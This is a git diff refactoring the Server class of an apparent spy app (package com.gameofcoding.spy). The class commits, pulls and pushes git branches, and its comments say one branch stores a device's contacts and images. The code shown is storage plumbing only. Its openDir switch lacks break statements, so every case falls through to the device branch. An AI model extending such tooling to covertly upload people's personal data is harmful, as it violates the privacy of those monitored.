@@ -4,33 +4,72 @@ import com.gameofcoding.spy.utils.XLog;
 import org.eclipse.jgit.api.errors.GitAPIException;
 
 /**
- * Main server class. This class handles all type of stdin and stdout process
+ * Server class is the main part of server package. This is where we upload and download data.
  */
 public class Server {
     private static String TAG = "Server";
+    private String mDeviceBranch;
+    private RepoManager mGitRepo;
+
+    /**
+     * Enum that contains directories where different types of data is stored.
+     * <p><b>MAIN:</b> This directory contains list of added devices, latest version name of app and other
+     * global things</p>
+     * <p><b>APP_DATA:</b> This is where app related data is stored, e.g Latest version of app.</p>
+     * <p><b>DEVICE:</b> Directory where device related things are stored like device contacts,
+     * images, etc.</p>
+     */
     public static enum Dir {
 	MAIN,
 	APP_DATA,
 	DEVICE
     };
-    private String mDeviceGitBranchName;
-    private RepoManager mGitRepo;
 
-    Server(RepoManager gitRepo, String deviceGitBranchName) {
+    /* package */ Server(RepoManager gitRepo, String deviceBranch) {
 	mGitRepo = gitRepo;
-	mDeviceGitBranchName = deviceGitBranchName;
+	mDeviceBranch = deviceBranch;
     }
 
+    private boolean saveChanges() throws GitAPIException {
+	// Commit changes
+	return mGitRepo.commit("spy_server");
+    }
+
+    /**
+     * Re-downloads all the directories,
+     */
+    public boolean reloadData() throws GitAPIException {
+	// Save any unsaved changes
+	saveChanges();
+
+	// Pull master, app_data and device branch
+	XLog.v(TAG, "reloadData(): Pulling '" + ServerManager.BRANCH_MASTER + "'");
+	mGitRepo.pull(ServerManager.BRANCH_MASTER);
+	XLog.v(TAG, "reloadData(): Pulling '" + ServerManager.BRANCH_APP_DATA + "'");
+	mGitRepo.pull(ServerManager.BRANCH_APP_DATA);
+	XLog.v(TAG, "reloadData(): Pulling '" + mDeviceBranch + "'");
+	mGitRepo.pull(mDeviceBranch);
+	XLog.v(TAG, "All branches successfully pulled!");
+	return true;
+    }
+
+    /**
+     * Opens the specified directory on which you can perform upload and download operations.
+     */
     public Directory openDir(Dir dir) throws GitAPIException {
 	XLog.v(TAG, "openDir(Directory): Opening dir [dir=" + dir + "]");
+
+	// Save any unsaved changes
+	saveChanges();
+
 	boolean hasCheckedOut = false;
 	switch(dir) {
 	case MAIN:
-	    hasCheckedOut = mGitRepo.checkout(RepoManager.LOCAL_BRANCH_SUFFIX + RepoManager.BRANCH_MASTER);
+	    hasCheckedOut = mGitRepo.checkout(ServerManager.BRANCH_MASTER);
 	case APP_DATA:
-	    hasCheckedOut = mGitRepo.checkout(RepoManager.REMOTE_BRANCH_SUFFIX + RepoManager.BRANCH_APP_DATA);
+	    hasCheckedOut = mGitRepo.checkout(ServerManager.BRANCH_APP_DATA);
 	case DEVICE:
-	    hasCheckedOut = mGitRepo.checkout(mDeviceGitBranchName);
+	    hasCheckedOut = mGitRepo.checkout(mDeviceBranch);
 	}
 	if(hasCheckedOut)
 	    return new Directory(mGitRepo);
@@ -38,34 +77,38 @@ public class Server {
 	    return null;
     }
 
-    public boolean reloadData() throws GitAPIException {
-	// Pull master and app_data
-	openDir(Dir.MAIN);
-	mGitRepo.pullRemoteBranch(RepoManager.BRANCH_MASTER);
-	openDir(Dir.APP_DATA);
-	mGitRepo.pullRemoteBranch(RepoManager.BRANCH_APP_DATA);
-	return true;
-    }
-	
-    public static class Directory {
+    /**
+     * Class that represents one directory.
+     */
+    public class Directory {
 	private static final String TAG = "Directory";
 	private RepoManager mGitRepo;
-	    
+
 	private Directory(RepoManager gitRepo) {
 	    mGitRepo = gitRepo;
 	}
-	    
-	public boolean saveChanges() throws GitAPIException {
-	    // Commit changes
-	    return mGitRepo.commit("spy_server");
-	}
-	    
+
+	/**
+	 * Uploads data of currently opened directory
+	 */
 	public boolean uploadData() throws GitAPIException {
 	    // Commit and push changes
-	    if(saveChanges())
-		if(mGitRepo.push())
+	    if(saveChanges()) {
+		XLog.i(TAG, "Pushing changes to remote");
+		if(mGitRepo.push()) {
+		    XLog.i(TAG, "Data pushed to remote");
 		    return true;
+		}
+	    }
 	    return false;
+	}
+
+	/**
+	 * Closes opened directory.
+	 * <b>NOTE: It just saves changes and nothing else.</b>
+	 */
+	public boolean close() throws GitAPIException {
+	    return saveChanges();
 	}
     }
 }
